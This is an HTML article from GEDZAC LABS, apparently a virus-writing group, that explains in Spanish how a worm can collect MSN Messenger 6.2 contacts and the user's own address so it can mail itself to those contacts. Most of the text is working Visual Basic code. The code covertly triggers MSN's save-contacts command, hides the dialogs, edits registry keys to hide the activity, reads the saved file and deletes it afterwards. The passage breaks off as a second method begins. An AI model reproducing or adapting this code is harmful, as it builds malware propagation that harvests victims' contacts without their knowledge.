@@ -1,0 +1,863 @@
+<html>
+<head>
+<title>Teorias sobres los contactos del MSN / Mitosis 3 - GEDZAC LABS</title>
+</head>
+<body bgcolor="#000000" text="#0066CC">
+<pre>
+<font color=white>
+Teorias sobres los contactos del MSN 6.2:
+--------------------------------------</font>
+
+Me andaba acordando de los buenos tiempos en que era más facil propagar un
+virus y recorde la tecnica de ErGrone de enviarse a los contactos del msn
+tecnica cuya efectividad esta bastante probada, con los virus de ErGrone,
+el Blink de RaZor, el Mapson de Falckon y ultimamente el Pawur de Cuk. 
+Eso antes se hacia leyendo los contactos en el registro, eso ya no se 
+puede, luego surgieron otros metodos, como usando las Apis del msn, 
+activando guardar los logs de las conversaciones, etc.
+
+Leyendo algunos de los articulos de la Mitosis 3 y algunos tutoriales de
+Iczelion (estos codigos estan basado en los de Nemlim y Iczelion, aclaracion
+para que no haya idea de plagio), se me ocurrieron algunas teorias para 
+obtener los contactos, son solo teorias, seguramente ya se les debe haber 
+ocurrido lo mismo a muchos, y tampoco aseguro que sean muy eficientes, ya 
+hay actualmente formas mejores para hacer esto, pero bueno pos ojala esto 
+sirva de algo.
+
+Los codigos estan diseñados para trabajar con la version 6.2, pero estoy
+casi seguro que se pueden adaptar para la version 7, algunas de las
+funciones que se usan aqui, estan más detalladas en el articulo de 
+"Spam en Programas de Mensageria", por eso no las detallo mucho aqui
+
+Primero una breve reseña de que nesecitamos actualmente para enviarnos
+a un correo de hotmail, antes si conectabamos al smtp de hotmail y envia-
+bamos de falsocorreo@hotmail.com a usuario@hotmail.com , el mail llegaba
+sin problemas a la bandeja de entrada de usuario@hotmail.com , ahora si 
+hacemos esto el mail llega a la carpeta de correo no deseado, cosa que
+puede estorbar bastante si el user no revisa esa carpeta, pero si enviamos
+un mail usando como remitente un contacto de msn de usuario@hotmail.com
+entonces si le llega a la bandeja de entrada.
+Entonces la idea es no solo obtener las direcciones de los contactos, sino
+la direccion del usuario conectado al msn, para usar su direccion, en el
+envio del virus a sus contactos.
+
+La primera teoria es esta:
+---------------------------
+El msn tiene la opcion en el menu Contactos de guardar los contactos del
+usuario, cuando el usuario selecciona esa opcion msn guarda los contactos
+en un archivo .ctt en la ruta indicada.
+
+Entonces la idea es automatizar ese proceso, hacer que el msn guarde los 
+contactos en la ruta por defecto y con el nombre por defecto (importante)
+luego ir a la ruta y leer el .ctt donde estan los contactos, en texto plano
+
+Cuando seleccionamos un menu o pulsamos el boton de una ventana, se envia
+a la ventana padre un mensage WM_COMMAND con un numero que identifica la
+accion a realizar, entonces cuando el usuario va con el mouse y selecciona
+al menu ese, solo esta enviando un mensage a la ventana, y la ventana
+en ese caso el msn, reacciona presentando el dialogo guardar, para que
+el user elija donde y con que nombre quiere guardar el .ctt
+
+Podemos enviar el mismo comando a la ventan usando las apis PostMessage
+o SendMessage, para eso antes deberemos obtener el handle de la ventana del
+msn:  PostMessage(handle,WM_COMMAND,#numero,0)
+Para averiguar #numero podemos usar la herramienta Spy++ del Visual Studio
+
+Luego que ya el msn ha mostrado el cuadro de dialogo guardar, obtenemos
+el handle del cuadro de dialogo y tambien con PostMessage o SendMessage
+enviamos un Enter, como si el usuario ubiera presionado enter para guardar
+el .ctt ,ya luego lo buscamos y lo leemos nomas.
+
+Code:
+<font color=white>form1:
+
+<font color=green>'declaraciones de las apis</font>
+Private Declare Function EnumWindows Lib "user32" (ByVal lpfn As Long, lParam As Any) As Boolean
+Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
+Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
+Private Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, lpOverlapped As Long) As Long
+Private Declare Function GetFileSize Lib "kernel32" (ByVal hFile As Long, lpFileSizeHigh As Long) As Long
+Private Const GENERIC_READ = &H80000000
+Private Const FILE_ATTRIBUTE_ARCHIVE = &H20
+Private Const OPEN_EXISTING = 3
+Private Declare Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
+Private Declare Function GlobalFree Lib "kernel32" (ByVal hMem As Long) As Long
+Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
+Private Const GMEM_FIXED = &H0
+Private Const GMEM_ZEROINIT = &H40
+
+Private Sub Form_Load()
+On Error Resume Next
+<font color=green>'ponemos Encontre a False</font>
+Encontre = False
+
+<font color=green>'borramos esta llave del reg, porque si el user guardo
+'antes sus contactos en alguna ruta o con otro nombre que no sea el por
+'defecto, msn lo recordara con esta llave y tratara de guardar en la
+'misma ruta, y como nos interesa que se guarde con las condiciones por
+'defecto borramos la llave</font>
+Rd "HKCU", "Software\Microsoft\MSNMessenger\", "ContactListPath"
+
+<font color=green>'este sub esta en el modulo, despues de guardar el .ctt
+'msn da un dialogo de "Se guardo correctamente el archivo", lo que nos
+'delataria, el sub escribe una llave en el reg para que no se muestre el
+'cuadro</font>
+Call OcultaDialog
+
+<font color=green>'usamos EnumWindows para listar las ventanas, le pasamos
+'con AddressOf la direccion de una funcion en el modulo que sera llamada
+'por cada ventana encontrada</font>
+Dim l As Boolean
+l = EnumWindows(AddressOf EnumeraVentanas, ByVal 0&)
+
+<font color=green>si Encontre es True, se ejecuta SacaContactos</font>
+If Encontre Then
+Call SacaContactos
+End If
+
+End
+End Sub
+
+Private Sub SacaContactos()
+On Error Resume Next
+Dim cttpath As String, cttname, email As String, c As String
+<font color=green>'dormimos el programa 3 seg, porque a veces msn se demora
+'en guardar los contactos</font>
+Sleep (3000)<font color=green>
+'Leemos esta llave del reg para obtener la ruta del folder "Mis Documentos"
+'del usuario actual, que es donde se guarda por defecto el .ctt</font>
+cttpath = Rr("HKCU", "Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "Personal")
+<font color=green>'obtenemos el nombre del primer .ctt del directorio con
+'Dir, normalmente solo debe estar el que hemos guardado</font>
+cttname = Dir(cttpath & "\*.ctt")
+
+<font color=green>'si obtuvimos un nombre igualamos cttpath a la ruta com-
+'pleta del .ctt ,sino salimos del sub </font>
+If cttname <> "" Then cttpath = cttpath & "\" & cttname Else Exit Sub
+
+<font color=green>'Obtenemos el mail del usuario local, por eso nos interesa
+'que se guarde con el nombre por defecto, que seria:
+'      Contactos para <font color=red>Usuario</font> (hotmail).ctt
+'donde lo que nos interesa es Usuario, porque luego armaremos el mail
+'Usuario@hotmail.com ,en Win98 tambien podemos encontrar el mail en
+'HKEY_CURRENT_USER\Software\Microsoft\MSNMessenger\User.NET Messenger Service</font>
+email = Split(cttname)(2) & "@hotmail.com"
+
+MsgBox "Tu Email: " & email   <font color=green>'</font>
+
+Dim hf As Long, sz As Long, bfm As Long, nr As Long, ctt As String
+<font color=green>'leemos el .ctt, para leer el .ctt podemos usar el fso
+'y leerlo con ReadAll o con instrucciones del compilador o
+'usando las apis de archivos y rellenando el buffer con Space() para no
+'usar las apis de memoria, pero lo hice asi para practicar como se usan
+'estas funciones y porque me parece que si se lo quisiera pasar a otro len-
+'guaje asi seria un codigo más estandar</font>
+
+<font color=green>'Usamos CreateFile para abrir el archivo, pasando
+'1° el path de .ctt, 2° GENERIC_READ para indicar que solo se va
+'a leer, 3° es el modo en que se va a compartir el archivo, ponemos 0
+'4° va una estructura SECURITY_ATRIBUTES como no la usamos pasamos 0
+'5° OPEN_EXISTING indica que si no existe da error, 
+'6° FILE_ATTRIBUTE_ARCHIVE para indicar que abrimos un archivo
+'7° no usamos este parametro, pasamos 0 ,si la funcion tiene exito debe
+'devolver en hf un handle al .ctt ,sino devuelve -1</font>
+hf = CreateFile(cttpath, GENERIC_READ, 0, ByVal 0&, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, 0)
+ If hf <> -1 Then
+<font color=green>'si tuvo exito obtenemos el tamaño del archivo en bytes
+'con GetFileSize al que le pasamos el handle del archivo abierto, y 
+'devuelve el tamaño en sz</font>
+  sz = GetFileSize(hf, 0)
+<font color=green>'luego usamos GlobalAlloc para crear un buffer en la
+'memoria, usamos las opciones GMEM_FIXED para que el buffer sea fijo,
+'GMEM_ZEROINIT para inicializarlo con ceros, y como 2° argumento el tamaño
+'del buffer en bytes, que en este caso es el tamaño del archivo que vamos
+'a leer, nos devuelve en bfm la direccion al buffer</font>
+  bfm = GlobalAlloc(GMEM_FIXED Or GMEM_ZEROINIT, sz)
+  If bfm <> 0 Then
+<font color=green>'leemos con ReadFile, pasando el handle del archivo
+'la direccion del buffer donde se almacenara lo leido, el tamaño del buffer
+'una variable (nr) que contendra el numero de bytes leidos y ultimo
+'va una estructura, pero como no usamos pasamos 0</font>
+   Call ReadFile(hf, ByVal bfm, sz, nr, ByVal 0)
+<font color=green>'rellenamos una variable string con tantos espacios como
+'bytes fueron leidos</font>
+   ctt = Space$(nr)
+<font color=green>'copiamos del buffer a la var string tantos bytes como
+'fueron leidos</font>
+   CopyMemory ByVal ctt, ByVal bfm, nr
+<font color=green>'liberamos el buffer usado</font>
+   Call GlobalFree(bfm)
+  End If
+ End If
+<font color=green>'cerramos el archivo</font>
+Call CloseHandle(hf)
+
+<font color=green>'esto es para obtener los contactos de lo que leimos
+'los muestra en un msgbox</font>
+Dim arc As Variant, contact As String
+arc = Split(LCase(ctt), vbCrLf)
+
+For i = 0 To UBound(arc) - 1
+ If InStr(arc(i), "@") <> 0 Then
+ contact = Mid(arc(i), InStr(arc(i), ">") + 1)
+ contact = Left(contact, InStr(contact, "<") - 1)
+  MsgBox contact
+ End If
+Next
+
+<font color=green>'esto es para borrar el .ctt despues de leerlo, sino la
+'proxima ves que se intente guardar el .ctt podria dar el mensage de ya
+'existe el archivo, por si hay más de 1 .ctt en el directorio busca
+'todos los que haya y los borra</font>
+cttpath = Rr("HKCU", "Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "Personal")
+c = Dir(cttpath & "\*.ctt")
+Sigue:
+If c <> "" Then DeleteFile (cttpath & "\" & c)
+c = Dir()
+If c <> "" Then GoTo Sigue
+End Sub
+
+---------------------------------------------------------------------------
+
+Modulo:
+
+<font color=green>'declaraciones de las apis y constantes</font>
+Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
+Private Declare Function GetForegroundWindow Lib "user32" () As Long
+Private Declare Function SetForegroundWindow Lib "user32" (ByVal hwnd As Long) As Long
+Private Declare Function AttachThreadInput Lib "user32" (ByVal idAttach As Long, ByVal idAttachTo As Long, ByVal fAttach As Long) As Long
+Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
+Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
+Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
+Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
+Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
+Private Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
+Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wFlag As Long) As Long
+Private Declare Function GetDesktopWindow Lib "user32" () As Long
+Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
+Private Declare Function SetFocus Lib "user32" (ByVal hwnd As Long) As Long
+
+Private Const WM_COMMAND = &H111
+Private Const SW_RESTORE = 9
+Private Const GW_HWNDNEXT = 2&
+Private Const GW_CHILD = 5&
+Private Const SW_HIDE = 0
+Private Const VK_RETURN = &HD
+Private Const WM_CHAR = &H102
+Private Const WM_KEYDOWN = &H100
+Private Const WM_KEYUP = &H101
+Private Const WM_SETTEXT = &HC
+Private Const WM_GETTEXT = &HD
+Private Const WM_GETTEXTLENGTH = &HE
+
+Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
+Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
+Private Declare Function RegQueryInfoKey Lib "advapi32.dll" Alias "RegQueryInfoKeyA" (ByVal hKey As Long, ByVal lpClass As String, lpcbClass As Long, ByVal lpReserved As Long, lpcSubKeys As Long, lpcbMaxSubKeyLen As Long, lpcbMaxClassLen As Long, lpcValues As Long, lpcbMaxValueNameLen As Long, lpcbMaxValueLen As Long, lpcbSecurityDescriptor As Long, lpftLastWriteTime As Any) As Long
+Private Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, ByVal lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As Any) As Long
+Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
+Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
+Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
+Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
+
+Private Const REG_SZ = 1
+Private Const REG_DWORD = 4
+Private Const ERROR_SUCCESS = 0&
+Private Const ERROR_NO_MORE_ITEMS = 259&
+Private Const KEY_ALL_ACCESS = &H3F
+Public Const REG_OPTION_NON_VOLATILE = 0
+Private Const KEY_QUERY_VALUE As Long = &H1
+Private Const KEY_ENUMERATE_SUB_KEYS = &H8
+Private Const HKEY_CLASSES_ROOT As Long = &H80000000
+Private Const HKEY_CURRENT_USER As Long = &H80000001
+Private Const HKEY_LOCAL_MACHINE As Long = &H80000002
+
+Public Encontre As Boolean
+
+Public Function EnumeraVentanas(ByVal hwnd As Long, lParam As Long) As Boolean
+<font color=green>'la funcion que es llamada por enumwindows por cada ventana
+'encontrada, tiene por argumentos el handle de la ventana encontrada y
+el segundo arcumento pasado a enumwindows, que en este caso no usamos</font>
+On Error Resume Next
+Dim ClassName As String * 255
+<font color=green>'Obtenemos el nombre de la clase de la ventana, si es
+'igual a msnmsblclass es la ventana del msn y pasamos el handle al sub msn</font>
+Call GetClassName(ByVal hwnd, ByVal ClassName, ByVal Len(ClassName))
+If InStr(LCase(ClassName), "msnmsblclass") <> 0 Then msn (hwnd)
+EnumeraVentanas = True
+End Function
+
+Private Sub msn(mHwnd As Long)
+On Error Resume Next
+Dim aw As Long, Whs As Long, Whd As Long
+
+<font color=green>'la api GetForegroundWindow devuelve el handle 
+'de la ventana que este en
+'primer plano o que tenga el foco, lo almacenamos en aw</font>
+aw = GetForegroundWindow
+
+<font color=green>'usamos ShowWindow para mostrar la ventana</font>
+ShowWindow mHwnd, SW_RESTORE
+
+<font color=green>'Si la ventana no esta en primer plano, usamos
+'api SetForegroundWindow para situarla en primer plano, a esta funcion
+'le pasamos el handle de la ventana que queremos tener en primer plano
+'Esto funciona bien en los 9x, pero en los WinXp, 2000, el sistema
+'no permite poner una ventana en primer plano en forma arbitraria
+'sino que lo que pasaria es que win solo haria que la ventana flasheara
+'(osea por ejemplo en una ventana de conversacion de msn, cuando un
+'contacto nos habla la ventana si no la tenemos en primer plano se pone
+'negra en la barra de tareas, pos algo parecido) osea para avisar al user
+'de que vea esa ventana pero no nos la pone en primer plano como
+'nesecitamos</font>
+If (aw <> mHwnd) Then
+
+<font color=green>'Para tenerla en primer plano recurrimos a una treta, 
+'primero obtenemos
+'el hilo de la ventana que esta activa con la api GetWindowThreadProcessId
+'y lo guardamos en Wnd, a esta funcion tenemos que pasarle el handle de la
+'ventana que queremos obtener el hilo y un cero en este caso, luego
+'obtenemos igual el hilo de la ventana de msn y lo guardamos en
+'Whs</font>
+Whd = GetWindowThreadProcessId(aw, ByVal 0)
+Whs = GetWindowThreadProcessId(mHwnd, ByVal 0)
+
+<font color=green>'Luego usamos la api AttachThreadInput para atachar, 
+'anexar, pegar, el hilo
+'de la ventana de msn al de la ventana activa, a esta api le
+'pasamos 1° el hilo que vamos a anexar, 2° el hilo al que le vamos a anexar
+'el otro y 3° True o False dependiendo de si queremos anexar o desanexar, en
+'este caso pasamos True para anexar, y ya una vez que window se cree que la 
+'ventana de msn forma parte de la ventana activa, proseguimos</font>
+Call AttachThreadInput(Whs, Whd, True)
+
+<font color=green>'iniciamos bucle para colocar en primer plano a la ventana
+'de msn con SetForegroundWindow pasandole su handle, 
+'y hasta que
+'GetForegroundWindow sea = al handle de la ventana de msn osea este 
+'en primer plano la ventana de msn, no salimos de bucle</font>
+Do
+Call SetForegroundWindow(ByVal mHwnd)
+Loop Until GetForegroundWindow = mHwnd
+End If
+
+<font color=green>'Usamos postmessage para enviar el mensaje que hara que se
+'muestre el cuadro de dialogo guardar</font>
+Call PostMessage(mHwnd, WM_COMMAND, 40287, 0)
+
+<font color=green>'volvemos a listar las ventanas para encontrar el handle
+'del cuadro de dialogo guardar, usamos GetWindow, pasandole el handle del
+'escritorio y GW_CHILD para indicar que se van a listar las ventanas hijas
+'de la ventana indicada en el primer argumento, todas las ventanas son 
+'hijas del escritorio, GetDesktopWindow devuelve el handle del escritorio
+'se pudiera haber aplicado GW_HWNDFIRST</font>
+dk = GetWindow(GetDesktopWindow(), GW_CHILD)
+
+<font color=green>'obtenemos el titulo de la ventana si lo tiene</font>
+Title = GetTextWindow(ByVal dk)
+<font color=green>'T = a la hora actual</font>
+T = Timer
+
+<font color=green>'si el titulo contiene guardar o save salimos del bucle
+'sino seguimos buscando</font>
+Do While (InStr(LCase(Title), "guardar") = 0) And (InStr(LCase(Title), "save") = 0)
+<font color=green>'obtenemos el handle a la siguiente ventana indicando
+'la opcion GW_HWNDNEXT</font>
+dk = GetWindow(dk, GW_HWNDNEXT)
+<font color=green>'obtenemos el titulo de la ventana</font>
+Title = GetTextWindow(ByVal dk)
+<font color=green>'si ya pasaron más de 10 segundo salimos</font>
+If Format(Timer - T, "0.00") > 10 Then Exit Do
+Loop
+
+<font color=green>'hacemos invisible el cuadro de dialogo guardar</font>
+ShowWindow dk, SW_HIDE
+
+<font color=green>'buscamos dentro del cuadro de dialogo el handle al
+'cuadro de texto donde se digita la ruta del archivo a guardar
+'lo buscamos por su clase Edit en win98 y ComboBoxEx32 en winXp</font>
+
+eh = FindWindowEx(dk, 0, "Edit", vbNullString)
+If eh = 0 Then eh = FindWindowEx(dk, 0, "ComboBoxEx32", vbNullString)
+
+<font color=green>'si encontramos el handle, lo pasamos a GuardarArchivo
+'si queremo guardarlo en otra ruta o con otro nombre lo podemos especificar
+'aqui, por ejem "c:\contactos.ctt" ,ponemos Encontre a True</font>
+If eh <> 0 Then GuardarArchivo eh, "c:\contactos.ctt": Encontre = True
+
+<font color=green>'DesAnexamos la ventana de conversacion, de la ventana que estaba activa
+'observese que el tercer parametro es ahora False</font>
+Call AttachThreadInput(Whs, Whd, False)
+
+<font color=green>'volvemos a establecer la ventana que estaba en primer plano</font>
+Call SetForegroundWindow(aw)
+End Sub
+
+<font color=green>'funcion que devuelve el titulo de las ventanas
+'tambien puede usarse api GetWindowText</font>
+Private Function GetTextWindow(ByVal hwnd As Long) As String
+On Error Resume Next
+Dim tLen As Long, wText As String
+
+<font color=green>no usamos postmessage ahora, porque postmessage envia el 
+'mensage y regresa inmediatamente sin esperar respuesta de la ventana, 
+'como queremos la respuesta de la ventana que nos respondera el tamaño
+'de su titulo y luego el titulo,usamos sendmessage, que espera 
+'la respuesta.</font>
+
+<font color=green>'obtenemos la longitud del titulo</font>
+tLen = SendMessage(hwnd, WM_GETTEXTLENGTH, 0, ByVal 0&)
+<font color=green>'creamos un buffer de la longitud del titulo +1 , el +1
+'creo que es para el null del final de la string</font>
+wText = Space$(tLen + 1)
+<font color=green>'obtenemos el titulo</font>
+Call SendMessage(hwnd, WM_GETTEXT, tLen + 1, ByVal wText)
+GetTextWindow = Left$(wText, tLen)
+End Function
+
+<font color=green>'sub que envia el enter al cuadro de dialogo guardar</font>
+Private Sub GuardarArchivo(ByVal hwnd As Long, ByVal path As String)
+On Error Resume Next
+<font color=green>'si se quiere guardarlo en otra ruta o con otro nombre
+'quitar el signo de comentario a las 2 sig. lineas</font><font color=yellow>
+ 'Call SetFocus(GetParent(hwnd))
+ 'Call SendMessageByString(hwnd, WM_SETTEXT, 0, path)</font>
+<font color=green>'la linea anterior escribe cierto texto en el 
+'cuadro de texto</font>
+
+<font color=green>'damos el foco al cuadro de dialogo guardar, y enviamos
+'el enter</font>
+Call SetFocus(GetParent(hwnd))
+Call PostMessage(hwnd, WM_KEYDOWN, VK_RETURN, 0&)
+Call SetFocus(GetParent(hwnd))
+Call PostMessage(hwnd, WM_KEYUP, VK_RETURN, 0&)
+End Sub
+
+<font color=green>'sub para borrar un valor del reg</font>
+Public Sub Rd(rKey As String, sKey As String, nKey As String)
+On Error Resume Next
+Dim RK As Long, l As Long, hKey As Long
+
+<font color=green>'un case para saber en donde tenemos que borrar la llave</font>
+Select Case rKey
+Case "HKCR"
+RK = HKEY_CLASSES_ROOT
+Case "HKCU"
+RK = HKEY_CURRENT_USER
+Case "HKLM"
+RK = HKEY_LOCAL_MACHINE
+End Select
+
+<font color=green>'abrimos la llave con la opcion KEY_ALL_ACCESS y obtene
+'mos un handle en hKey</font>
+l = RegOpenKeyEx(RK, sKey, 0, KEY_ALL_ACCESS, hKey)
+<font color=green>'borramos el valor que queremos</font>
+Call RegDeleteValue(hKey, nKey)
+<font color=green>'cerramos la llave</font>
+Call RegCloseKey(hKey)
+End Sub
+
+<font color=green>'sub que oculta el cuadro de dialogo que muestra msn
+'luego de guardar los contactos, para eso se debe escribir un valor
+'dentro de una subllave de Software\Microsoft\MSNMessenger\PerPassportSettings
+'pero los nombres de estas subllaves son numeros, asi que como no sabemos
+'el nombre exacto enumeramos todas las subllaves que haya dentro y 
+'escribimos el valor dentro de ellas, originalmente el valor es un valor
+'binario, pero no me funkaba bien al ponerlo como binario, por eso lo
+'puse como DWORD, al msn le da igual</font>
+Public Sub OcultaDialog()
+On Error Resume Next
+Dim l As Long, hKey As Long
+Dim SubKeys As Long, MaxSubKeyLen As Long
+Dim NameKey As String, Index As Long
+
+<font color=green>'abrimos la llave a la que le vamos a enumerar
+'las subllaves</font>
+l = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\MSNMessenger\PerPassportSettings", 0, KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS, hKey)
+
+<font color=green>'si no hay exito cerramos la llave</font>
+If l <> ERROR_SUCCESS Then: Call RegCloseKey(hKey): Exit Sub
+
+<font color=green>'averiguamos si la llave tiene subllaves</font>
+l = RegQueryInfoKey(hKey, 0&, 0&, 0&, SubKeys, MaxSubKeyLen, 0&, 0&, 0&, 0&, 0&, 0&)
+
+<font color=green>'si hay subllaves</font>
+If (SubKeys > 0) And (l = ERROR_SUCCESS) Then
+<font color=green>'creamos un buffer para recibir el nombre de la subllave</font>
+NameKey = Space$(255)
+
+<font color=green>'iniciamos un bucle para listar las subllaves</font>
+Do While (RegEnumKeyEx(hKey, Index, NameKey, 255, 0&, 0&, 0&, 0&) <> ERROR_NO_MORE_ITEMS)
+DoEvents
+
+<font color=green>'escribimos en cada subllave el valor</font>
+Rw "HKCU", "Software\Microsoft\MSNMessenger\PerPassportSettings\" & CStr(Mid(NameKey, 1, InStr(NameKey, Chr(0)) - 1)), "DSBuddyListSaved", 1, "DW"
+
+<font color=green>'aumentamos Index en 1 para acceder a la siguiente
+'subllave</font>
+Index = Index + 1
+Loop
+
+End If
+<font color=green>'cerramos la llave</font>
+l = RegCloseKey(hKey)
+End Sub
+
+<font color=green>'sub para escribir en el registro</font>
+Public Sub Rw(rKey As String, sKey As String, nKey As String, vKey As Variant, mVal As String)
+On Error Resume Next
+Dim RK As Long, l As Long, hKey As Long
+<font color=green>'un case para saber en donde tenemos que escribir la llave</font>
+Select Case rKey
+Case "HKCR"
+RK = HKEY_CLASSES_ROOT
+Case "HKCU"
+RK = HKEY_CURRENT_USER
+Case "HKLM"
+RK = HKEY_LOCAL_MACHINE
+End Select
+
+<font color=green>'abrimos o creamos la llave</font>
+l = RegCreateKeyEx(RK, sKey, ByVal 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, ByVal 0&, hKey, l)
+
+<font color=green>'un case para ver que tipo de dato vamos a escribir
+'de cadena o DWORD</font>
+Select Case mVal
+Case "SZ"
+Dim sVal As String
+ sVal = vKey
+ l = RegSetValueEx(hKey, nKey, 0&, REG_SZ, ByVal sVal, Len(sVal) + 1)
+Case "DW"
+Dim lVal As Long
+lVal = vKey
+ l = RegSetValueEx(hKey, nKey, 0&, REG_DWORD, lVal, 4)
+End Select
+
+<font color=green>'cerramos la llave</font>
+l = RegCloseKey(hKey)
+End Sub
+
+<font color=green>'funcion para leer el registro</font>
+Public Function Rr(rKey As String, sKey As String, nKey As String)
+On Error Resume Next
+Dim RK As Long, l As Long, hKey As Long, ky As Long, fKey As String
+<font color=green>'un case para saber en donde tenemos que leer la llave</font>
+Select Case rKey
+Case "HKCR"
+RK = HKEY_CLASSES_ROOT
+Case "HKCU"
+RK = HKEY_CURRENT_USER
+Case "HKLM"
+RK = HKEY_LOCAL_MACHINE
+End Select
+
+<font color=green>'abrimos la llave</font>
+l = RegOpenKeyEx(RK, sKey, 0, KEY_QUERY_VALUE, hKey)
+<font color=green>'leemos el tamaño del valor</font>
+  l = RegQueryValueEx(hKey, nKey, 0&, REG_SZ, 0&, ky)
+
+<font color=green>'hacemos un buffer del tamaño recibido para almacenar
+'el valor</font>  
+fKey = String(ky, Chr(32))
+
+<font color=green>'si error salimos</font>
+If l <= 2 Then Rr = "": Exit Function
+
+<font color=green>'leemos el valor</font>
+  l = RegQueryValueEx(hKey, nKey, 0&, REG_SZ, ByVal fKey, ky)
+  
+fKey = Left$(fKey, ky - 1)
+
+<font color=green>'cerramos la llave</font>
+l = RegCloseKey(hKey)
+  
+Rr = fKey
+End Function
+-------------------------------------------------------------------------
+</font>
+
+Comentario del Metodo:
+-----------------------
+Para que funcione, la ventana del msn debe estar abierta, osea no minimi-
+zada al lado del relog.
+
+Tambien hay que hacer un Timer para buscar cada cierto tiempo la ventana
+
+Se podria guardar una lista de los correos a los que ya nos hemos enviado
+porque muy posiblemente capturaremos los mismos contactos más de una vez
+y eso evitaria que nos reenviaramos al mismo sitio, ahora que si reen-
+viarse en más de una ocasion no les es problema, pos asi nomas
+
+Tambien este metodo segun las pruebas, falla a veces, tambien en algunos
+win, no me refiero a las versiones de win, porque funka en un xp y en 
+otro xp no, funka en un w98 y en otro w98 no, ¿? (50% de eficacia)
+
+A veces deja colgada la ventana del msn
+
+
+Segunda Teoria:
+----------------
+El msn muestra los contactos en un control SysListView, y en ese tipo de
+control se pueden añadir, eliminar y Leer los items (ver articulo de
+Nuevas_Tecnicas_Stealth de Nemlim para mayor referencia), entonces lo que
+haremos sera leer los items del syslistview, pero normalmente lo que se
+muestra hay son los "Nombres para Mostrar" como los llama el msn, osea
+el nick o frase que el contacto se pone, pero el msn tiene en el menú
+contactos la opcion de "Ver contactos por su direccion de correo"
+entonces como es la opcion de un menu, debemos enviar un WM_COMMAND
+con postmessage para activar la opcion, luego leer los items del 
+syslistview, pero la forma estandar de leer eso solo funciona si el 
+syslistview a sido creado por nuestro propio proceso, si usamos esa forma
+para leer un syslistview de otro proceso, win da error, buscando en google
+encontre un ejemplo de como hacer eso, para tomar como modelo, se tiene
+que trabajar con la memoria del proceso que creo el syslistview, las funcio-
+nes que usaremos para esto no estan disponibles en Win9x ni WinME, solo en
+Win2000, WinXP y WinNT (segun teoria), probandolo en 98 y xp, solo funko
+en xp.
+
+Code:
+
+<font color=white>form1:
+
+<font color=green>'en el form usamos enumwindows para listar todas las ventanas, 
+'por cada ventana encontrada se llamara a la funcion, EnumeraVentanas
+'que esta en un modulo</font>
+Private Declare Function EnumWindows Lib "user32" (ByVal lpfn As Long, lParam As Any) As Boolean
+
+Private Sub Form_Load()
+On Error Resume Next
+
+Dim l As Boolean
+l = EnumWindows(AddressOf EnumeraVentanas, ByVal 0&)
+
+End
+End Sub
+
+----------------------------------------------------------------------------
+
+Module1:
+
+<font color=green>'declaramos apis y constantes</font>
